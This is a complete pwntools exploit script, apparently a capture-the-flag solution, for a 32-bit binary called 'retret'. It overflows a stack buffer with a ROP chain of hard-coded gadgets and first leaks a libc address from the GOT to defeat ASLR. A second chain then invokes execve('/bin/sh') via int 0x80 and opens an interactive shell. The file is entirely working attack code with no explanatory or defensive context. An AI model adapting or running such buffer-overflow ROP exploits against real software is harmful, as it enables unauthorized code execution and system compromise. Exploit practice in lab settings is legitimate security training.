from pwn import *

# Binary setup
e = ELF('./retret')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# gadget list
pop_eax_ecx = 0x08049099  # pop eax; pop ecx; ret (CRITICAL)
pop_ebx = 0x0804901e      # pop ebx; ret
pop_ecx = 0x0804909a      # pop ecx; ret
pop_edx = 0x080490f6      # pop edx; ret
int_0x80 = 0x080490a7     # int 0x80
ret = 0x08049022          # Stack alignment
addr__libc_start_main = e.got['__libc_start_main']
addr_main = 0x80491d5

p = process('./retret')

# 1. Get libc func addr.
payload1 = b'A' * 0x1004
payload1 += p32(pop_eax_ecx) + p32(4) + p32(addr__libc_start_main) + p32(pop_ebx) + p32(1)
payload1 += p32(pop_edx) + p32(4) + p32(int_0x80) + p32(addr_main)

# print("1st payload: ", payload1)
p.sendline(payload1)
leak = u32(p.recv(4))
print("leak: ", hex(leak))
libc_base = leak - 0x1aa50
success(f"Libc base: {hex(libc_base)}")

# 2. call /bin/sh
system_addr = libc_base + libc.symbols['system']
print("system: ", hex(libc.symbols['system']))
binsh_addr = libc_base + 0x1bd0d5

payload = flat(
    b'A' * 0x1004,
    pop_eax_ecx, 11, (binsh_addr + 7),
    pop_ebx, binsh_addr,
    pop_edx, 0,
    int_0x80,
    addr_main
)
# print("2nd payload: ", hex(payload))

p.sendline(payload)
print()
p.interactive()